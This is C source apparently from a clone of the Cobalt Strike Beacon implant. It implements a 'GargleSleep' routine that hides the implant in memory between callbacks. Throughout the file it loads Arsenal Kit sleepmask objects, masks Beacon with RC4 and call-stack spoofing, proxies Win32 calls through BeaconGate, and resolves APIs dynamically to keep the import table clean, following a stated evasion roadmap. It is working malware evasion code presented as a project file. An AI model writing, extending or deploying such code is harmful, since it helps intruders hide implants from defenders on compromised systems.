/* gargle! */
#include <winsock2.h>
#include "spawn_trace.h" /* KDEBUG probe decl */
#include <windows.h>
#include <intrin.h>
#include "beacon.h"
#include "gargleint.h"
#include "track_memory.h"
#include "datastore.h"
#include "sleepmask_gen3.h"
#include "beacon_gate.h" /* FUNCTION_CALL, gate_set_executor */
#include "parse.h"
#include <stdlib.h>


typedef void(*GARGLEF)(GARGLEP * parms, void (__stdcall *Sleep)(DWORD), DWORD time);

/* this is the stub function we copy over */
/* For CS 4.4 the pattern size is 268 */
/* For CS 4.5 the pattern size is 768 */
static void _gargle_it(GARGLEP * parms, void(__stdcall *pSleep)(DWORD), DWORD time) {
	GARGLE_TRAMPOLINE_STUB()
}

static void setup_trampoline2() {
	gargle_trampoline(setup_trampoline2, _gargle_it);
}

/* kit-compat test knob: BEACON_SLEEPMASK_KIT=1 in the beacon process
 * skips the gen3 window so GargleSleep exercises the official TS-embedded
 * sleepmask BOF path - the 4.9 Arsenal Kit contract
 * sleep_mask(parms, pSleep, time) driven by conv=1 in boff.cpp. Resolved
 * dynamically (GetModuleHandleA/GetProcAddress are already static imports
 * via sleepmask_gen3's g3_init) so the import table stays untouched. */
static int kit_path_forced(void) {
	HMODULE k32;
	DWORD (WINAPI * pGetEnv)(LPCSTR, LPSTR, DWORD);
	char buf[8];
	k32 = GetModuleHandleA("kernel32.dll");
	if (k32 == NULL)
		return 0;
	pGetEnv = (DWORD (WINAPI *)(LPCSTR, LPSTR, DWORD))GetProcAddress(k32, "GetEnvironmentVariableA");
	if (pGetEnv == NULL)
		return 0;
	return pGetEnv("BEACON_SLEEPMASK_KIT", buf, sizeof(buf)) > 0 && buf[0] == '1';
}

#if defined(_M_X64)
/* ---- the 4.10+ user sleepmask (arsenal-kit contract) ----
 *
 * A sleep-mask object built for 4.10+ exports
 *
 *     void sleep_mask(PBEACON_INFO info, PFUNCTION_CALL fc)
 *
 * and runs every call Beacon hands it - the sleep itself and each
 * BeaconGate-proxied Win32 call - masking Beacon around it when fc->bMask
 * says so. The object sits in the SSSS region with bit 31 of the length
 * word set (the TS sets it for the kit's dictionary hook return). It is
 * loaded once and stays resident, as it does with the official Beacon:
 * every call goes to its entry point by address, with a BEACON_INFO filled
 * from the live image. (A load per call ran inside whatever BOF was
 * loading or running at the time and recycled its block - the loader
 * cache holds one - and cost three ungated Virtual* calls per gated
 * one.) */
static int g_sm410_state; /* 0 = region not probed, 1 = in service, 2 = none or broken */
static RESIDENT_OBJECT g_sm410_obj; /* its block and entry point, once loaded */

/* Load the object for good. FALSE = there is no usable object: the region
 * holds none, or the object does not link. */
static BOOL sm410_load(void)
{
	char * decoded;
	datap parser;
	DWORD entry;
	int dlen, contract, prefix;
	RESIDENT_OBJECT obj;

	memset(&obj, 0, sizeof(obj));
	decoded = (char *)malloc(SLEEPMASK_REGION_PATCH);
	if (decoded == NULL) {
		spawn_log("sm410: no memory", 0);
		return FALSE;
	}
	dlen = sleepmask_decode(decoded, SLEEPMASK_REGION_PATCH, &contract);
	if (dlen <= 16 || !contract) {
		memset(decoded, 0, SLEEPMASK_REGION_PATCH);
		free(decoded);
		spawn_log("sm410: region has no 4.10 object len=", (long)dlen);
		return FALSE;
	}

	/* the object's wire form: [bssSize][six sections][relocations][entry] */
	data_init(&parser, decoded, dlen);
	data_int(&parser);
	data_extract(&parser);
	data_extract(&parser);
	data_extract(&parser);
	data_extract(&parser);
	data_extract(&parser);
	data_extract(&parser);
	prefix = dlen - parser.length;
	entry = data_int(&parser);

	if (!command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&obj, (int)sizeof(obj), 3) || obj.entry == NULL) {
		memset(decoded, 0, SLEEPMASK_REGION_PATCH);
		free(decoded);
		spawn_log("sm410: load FAILED", 0);
		return FALSE;
	}
	/* the object lives in its own block now: nothing of it stays on the heap */
	memset(decoded, 0, SLEEPMASK_REGION_PATCH);
	free(decoded);
	g_sm410_obj = obj;
	/* what a BOF's BeaconInformation() reports as the sleep mask */
	beacon_sleep_mask_set_exec(obj.base, obj.text, obj.total);
	return TRUE;
}

/* the gate's executor: every gated call goes through the object. When
 * there is no usable object it is taken out of the gate and the call
 * goes back to gate_dispatch, which runs it with the built-in
 * executors. The object runs from its own block with the image in the
 * clear; the info sits on this stack and is gone when it returns. */
#define SM410_HEAP_COPY 256 /* heap records described to the object, at most */

static BOOL sm410_gate(FUNCTION_CALL * fc)
{
	BEACON_INFO info;
	HEAP_RECORD heap_copy[SM410_HEAP_COPY];

	if (g_sm410_state != 1 || fc == NULL)
		return FALSE;
	if (g_sm410_obj.entry == NULL && !sm410_load()) {
		g_sm410_state = 2;
		gate_set_executor(NULL);
		return FALSE;
	}
	spawn_log("sm410: call api=", (long)fc->function);
	beacon_info_fill(&info, g_sm410_obj.base, g_sm410_obj.text, g_sm410_obj.total);
	/* what the call's arguments point into stays in the clear (a settings
	 * string handed to WinInet) - the built-in engine's rule */
	if (fc->bMask)
		beacon_info_keep_plaintext(&info, fc->args, fc->numOfArgs, heap_copy, SM410_HEAP_COPY);
	((void (*)(BEACON_INFO *, FUNCTION_CALL *))g_sm410_obj.entry)(&info, fc);
	return TRUE;
}
#endif

void GargleSleep(DWORD time) {
	spawn_log("gargle: sleep time=", (long)time);
#if !defined(_M_IX86)
	GARGLEF func;
#endif
	char * decoded;
	int dlen;

	/* nook=0: Sleep() without a 16KB stack frame (__chkstk on x86 spawn). */
	if (setting_int(SETTING_GARGLE_NOOK) == 0 || threadcount > 0) {
		Sleep(time);
		return;
	}

#if defined(_M_X64)
	/* the 4.10+ user sleepmask, when the region carries one, owns the sleep
	 * - and, as the gate's executor, every gated call. Its bMask rules are
	 * the built-in ones (interactive, worker threads, the switches). */
	if (g_sm410_state == 0) {
		g_sm410_state = sleepmask_contract() ? 1 : 2;
		spawn_log("sm410: probe state=", (long)g_sm410_state);
	}
	if (g_sm410_state == 1) {
		FUNCTION_CALL fc;
		memset(&fc, 0, sizeof(fc));
		fc.functionPtr = (void *)Sleep;
		fc.function    = -1; /* not one of the proxied APIs: the sleep itself */
		fc.numOfArgs   = 1;
		fc.args[0]     = (unsigned long long)time;
		fc.bMask       = TRUE;
		/* the same road as every gated call: the re-entrancy guard (loading
		 * the object makes gated calls) and the bMask rules (an interactive
		 * Beacon sleeps in the clear) */
		gate_set_executor(sm410_gate);
		gate_dispatch(&fc);
		if (g_sm410_state == 1)
			return;
		/* the object failed to load: the executor is gone (sm410_gate), the
		 * built-in engines take over */
		spawn_log("sm410: fell back", 0);
	}

	/* Phase 1: self-contained Gen3 window (RC4 + callstack spoof) first;
	 * any init failure falls through to the official sleepmask BOF. */
	if (!kit_path_forced() && gen3_sleep(time))
		return;
	g3_log("gargle: gen3 fell back to official path", 0x7fffffff);
#else
	/* x86: no gen3 (size budget) and the official sleepmask BOF crashes in
	 * WOW64 - the window is served unmasked by design. See
	 * EVASION-ROADMAP section 13.6 for the size numbers. */
	Sleep(time);
	return;
#endif

	decoded = (char *)malloc(SLEEPMASK_REGION_PATCH);
	if (decoded == NULL) {
		Sleep(time);
		return;
	}
	dlen = sleepmask_decode(decoded, SLEEPMASK_REGION_PATCH, NULL);
	if (dlen > 16) {
		datap parser;
		DWORD entry;
		int prefix;
		DWORD be_time;
		data_init(&parser, decoded, dlen);
		data_int(&parser);
		data_extract(&parser);
		data_extract(&parser);
		data_extract(&parser);
		data_extract(&parser);
		data_extract(&parser);
		data_extract(&parser);
		prefix = dlen - parser.length;
		entry = data_int(&parser);
		/* decoded holds the plaintext sleep-mask BOF across the masked
		 * sleep - pull it into the walk, then wipe it before free */
		track_memory_add(decoded, SLEEPMASK_REGION_PATCH, TRACK_MEMORY_MALLOC, TRUE, NULL);
#if defined(_M_X64)
		be_time = time;
		if (!command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&be_time, (int)sizeof(be_time), 1))
			Sleep(time);
#else
		be_time = htonl(time);
		if (!command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&be_time, (int)sizeof(be_time), 0))
			Sleep(time);
#endif
		track_memory_remove(decoded);
		memset(decoded, 0, SLEEPMASK_REGION_PATCH);
		free(decoded);
		return;
	}
	memset(decoded, 0, SLEEPMASK_REGION_PATCH);
	free(decoded);

	/* The 4.5 trampoline body is an INT3 placeholder in this codebase (the
	 * original comment said x86 must not execute it - x64 must not either):
	 * gtrampoline points at the raw template stub, so this fallback branch
	 * used to be a guaranteed INT3 storm whenever it was reached with
	 * nook != 0 (no gen3, no decodable sleepmask BOF). Degrade to a plain
	 * Sleep instead - unmasked, never a crash. A real wait-window variant
	 * belongs to the gen3 family (follow-up entry in EVASION-ROADMAP). */
	Sleep(time);
#if defined(_M_X64)
	(void)func;
#endif
}
